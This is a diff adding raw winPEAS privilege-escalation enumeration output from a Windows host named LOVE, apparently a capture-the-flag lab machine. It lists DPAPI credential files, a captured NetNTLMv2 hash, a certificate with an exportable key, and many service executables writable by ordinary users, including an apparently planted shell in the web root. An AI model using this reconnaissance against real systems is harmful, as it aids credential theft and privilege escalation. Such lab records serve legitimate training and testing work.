+    Block COM Port Redirection              :       
+    Block Drive Redirection                 :       
+    Block LPT Port Redirection              :       
+    Block PnP Device Redirection            :       
+    Block Printer Redirection               :       
+    Allow Smart Card Redirection            :       
+
+  RDP Client Settings
+    Disable Password Saving                 :       True
+    Restricted Remote Administration        :       False
+
+  [+] Recently run commands
+    Not Found
+
+  [+] Checking for DPAPI Master Keys
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+    MasterKey: C:\Users\Phoebe\AppData\Roaming\Microsoft\Protect\S-1-5-21-2955427858-187959437-2037071653-1002\bca7373f-6548-4566-9315-643fed2f8f44
+    Accessed: 5/3/2021 7:44:18 PM
+    Modified: 4/12/2021 3:50:43 PM
+   =================================================================================================
+
+
+  [+] Checking for DPAPI Credential Files
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+    CredFile: C:\Users\Phoebe\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
+    Description: Local Credential Data
+
+    MasterKey: bca7373f-6548-4566-9315-643fed2f8f44
+    Accessed: 5/3/2021 7:44:03 PM
+    Modified: 4/23/2021 3:37:47 AM
+    Size: 11200
+   =================================================================================================
+
+    [i] Follow the provided link for further instructions in how to decrypt the creds file
+
+  [+] Checking for RDCMan Settings Files
+   [?] Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
+    Not Found
+
+  [+] Looking for Kerberos tickets
+   [?]  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
+    Not Found
+
+  [+] Looking for saved Wifi credentials
+  [X] Exception: The service has not been started
+
+  [+] Looking AppCmd.exe
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
+    Not Found
+      You must be an administrator to run this check
+
+  [+] Looking SSClient.exe
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
+    Not Found
+
+  [+] Enumerating SSCM - System Center Configuration Manager settings
+
+  [+] Enumerating Security Packages Credentials
+  Version: NetNTLMv2
+  Hash:    Phoebe::LOVE:1122334455667788:fc228a5c5352b7d9c8ba0a804f900461:0101000000000000814ec1658f40d7018741da1b87adec02000000000800300030000000000000000000000000200000256ae3ae3711cca92a2bc966253f097f74b46ecf2bedc14eb301051694700a360a00100000000000000000000000000000000000090000000000000000000000
+
+   =================================================================================================
+
+
+
+  ========================================(Browsers Information)========================================
+
+  [+] Showing saved credentials for Firefox
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+  [+] Looking for Firefox DBs
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for GET credentials in Firefox history
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Showing saved credentials for Chrome
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+  [+] Looking for Chrome DBs
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for GET credentials in Chrome history
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Chrome bookmarks
+    Not Found
+
+  [+] Showing saved credentials for Opera
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+  [+] Showing saved credentials for Brave Browser
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+  [+] Showing saved credentials for Internet Explorer (unsupported)
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+  [+] Current IE tabs
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for GET credentials in IE history
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+
+  [+] IE favorites
+    http://go.microsoft.com/fwlink/p/?LinkId=255142
+
+
+  ==============================(Interesting files and registry)==============================
+
+  [+] Putty Sessions
+    Not Found
+
+  [+] Putty SSH Host keys
+    Not Found
+
+  [+] SSH keys in registry
+   [?] If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry
+    Not Found
+
+  [+] SuperPutty configuration files
+
+  [+] Enumerating Office 365 endpoints synced by OneDrive.
+
+    SID: S-1-5-19
+   =================================================================================================
+
+    SID: S-1-5-20
+   =================================================================================================
+
+    SID: S-1-5-21-2955427858-187959437-2037071653-1002
+      Name:  Personal
+        UserFolder                                 C:\Users\Phoebe\OneDrive
+   =================================================================================================
+
+    SID: S-1-5-21-2955427858-187959437-2037071653-500
+   =================================================================================================
+
+    SID: S-1-5-18
+   =================================================================================================
+
+
+  [+] Cloud Credentials
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+  [+] Unattend Files
+
+  [+] Looking for common SAM & SYSTEM backups
+
+  [+] Looking for McAfee Sitelist.xml Files
+
+  [+] Cached GPP Passwords
+
+  [+] Looking for possible regs with creds
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
+    Not Found
+    Not Found
+    Not Found
+    Not Found
+
+  [+] Looking for possible password files in users homes
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
+
+  [+] Searching for Oracle SQL Developer config files
+
+
+  [+] Slack files & directories
+  note: check manually if something is found
+
+  [+] Looking for LOL Binaries and Scripts (can be slow)
+   [?]  https://lolbas-project.github.io/
+   [!] Check skipped, if you want to run it, please specify '-lolbas' argument
+
+  [+] Enumerating Outlook download files
+
+
+  [+] Enumerating machine and user certificate files
+
+  Issuer             : CN=LOVE
+  Subject            : CN=LOVE
+  ValidDate          : 4/11/2021 7:39:19 AM
+  ExpiryDate         : 4/10/2024 7:39:19 AM
+  HasPrivateKey      : True
+  StoreLocation      : LocalMachine
+  KeyExportable      : True
+  Thumbprint         : 84EFD922A70A6D9D82B85BB3D04F066B12F86E73
+
+  Enhanced Key Usages
+       Server Authentication
+   =================================================================================================
+
+
+  [+] Searching known files that can contain creds in home
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    C:\Users\Phoebe\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlskey.der
+    C:\Users\Phoebe\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlscert.der
+    C:\Users\Phoebe\NTUSER.DAT
+    C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+  [+] Looking for documents --limit 100--
+    Not Found
+
+  [+] Office Most Recent Files -- limit 50
+
+  Last Access Date           User                                           Application           Document
+
+  [+] Recent files --limit 70--
+    Not Found
+
+  [+] Looking inside the Recycle Bin for creds files
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+  [+] Searching hidden files or folders in C:\Users home (can be slow)
+
+     C:\Users\All Users\ntuser.pol
+
+  [+] Searching interesting files in other users home directories (can be slow)
+
+     Checking folder: c:\users\administrator
+
+   =================================================================================================
+
+
+  [+] Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
+     File Permissions "C:\xampp\install\portcheck.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\install\awk.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\htdocs\omrs\includes\D3fa1t_shell.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\htdocs\omrs\bower_components\bootstrap-datepicker\docs\make.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\htdocs\omrs\bower_components\bootstrap\nuget\MyGet.ps1": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\makecert.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\apache_uninstallservice.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\apache_installservice.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\scripts\ctl.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\wintty.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\rotatelogs.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\pv.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\openssl.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\logresolve.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\httxt2dbm.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\httpd.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\htpasswd.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\htdigest.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\htdbm.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\htcacheclean.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\curl.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\ApacheMonitor.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\abs.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache\bin\ab.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\xampp_stop.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\xampp_start.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\xampp_shell.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\xampp-control.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\uninstall.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\test_php.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\setup_xampp.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\service.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql_stop.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql_start.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mercury_stop.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mercury_start.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\killprocess.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\filezilla_stop.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\filezilla_start.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\filezilla_setup.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\ctlscript.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\catalina_stop.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\catalina_start.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\catalina_service.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache_stop.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\apache_start.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\Administration\Program Files\VMware\VMware Tools\x64\VMwareToolsUpgrader.exe": Phoebe [AllAccess],Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\Administration\Program Files\VMware\VMware Tools\VMwareToolsUpgrader.exe": Phoebe [AllAccess],Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\Administration\VMwareToolsUpgrader.exe": Phoebe [AllAccess],Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\Administration\setup64.exe": Phoebe [AllAccess],Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\Administration\setup.exe": Phoebe [AllAccess],Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\tmp\winpeas.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\src\xampp-usb-lite\setup_xampp.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\src\xampp-usb-lite\make-usb-xampp.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\src\xampp-nsi-installer\xa-icons\portcheck.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\phpunit.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\phpdbg.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\php.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\php-win.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\php-cgi.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\pecl.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\peardev.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\pear.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\pciconf.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\pci.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\deplister.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\windowsXamppPhp\phpdbg.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\windowsXamppPhp\php.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\windowsXamppPhp\php-win.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\windowsXamppPhp\php-cgi.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\windowsXamppPhp\deplister.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\scripts\pciconf.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\scripts\compatinfo.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\php\extras\openssl\openssl.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\resetroot.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\mysql_uninstallservice.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\mysql_installservice.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\scripts\ctl.bat": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\sst_dump.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\replace.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\perror.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\my_print_defaults.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysql_upgrade_wizard.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysql_upgrade_service.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysql_upgrade.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysql_tzinfo_to_sql.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysql_plugin.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysql_ldb.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysql_install_db.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysqlslap.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysqlshow.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysqlimport.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysqldump.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysqld.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysqlcheck.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysqlbinlog.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysqladmin.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mysql.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\myisam_ftdump.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\myisampack.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\myisamlog.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\myisamchk.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mbstream.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\mariabackup.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\innochecksum.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\aria_read_log.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\aria_pack.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\aria_ftdump.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\aria_dump_log.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mysql\bin\aria_chk.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\xampp\mailtodisk\mailtodisk.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\Skype.exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\python3.exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\python.exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\GameBarElevatedFT_Alias.exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\GameBarElevatedFT_Alias.exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\Microsoft.SkypeApp_kzf8qxf38zg5c\Skype.exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python.exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\Windows\INetCache\IE\1P0A6FMQ\winpeas[1].exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": Phoebe [AllAccess]
+     File Permissions "C:\Users\Phoebe\AppData\Local\Microsoft\OneDrive\OneDrive.exe": Phoebe [AllAccess]
+
+  [+] Looking for Linux shells/distributions - wsl.exe, bash.exe
+
+       /---------------------------------------------------------------------------\
+       |                             Do you like PEASS?                            |
+       |---------------------------------------------------------------------------| 
+       |         Become a Patreon    :     https://www.patreon.com/peass           |
+       |         Follow on Twitter   :     @carlospolopm                           |
+       |---------------------------------------------------------------------------|
+       |                                 Thank you!                                |
+       \---------------------------------------------------------------------------/
+
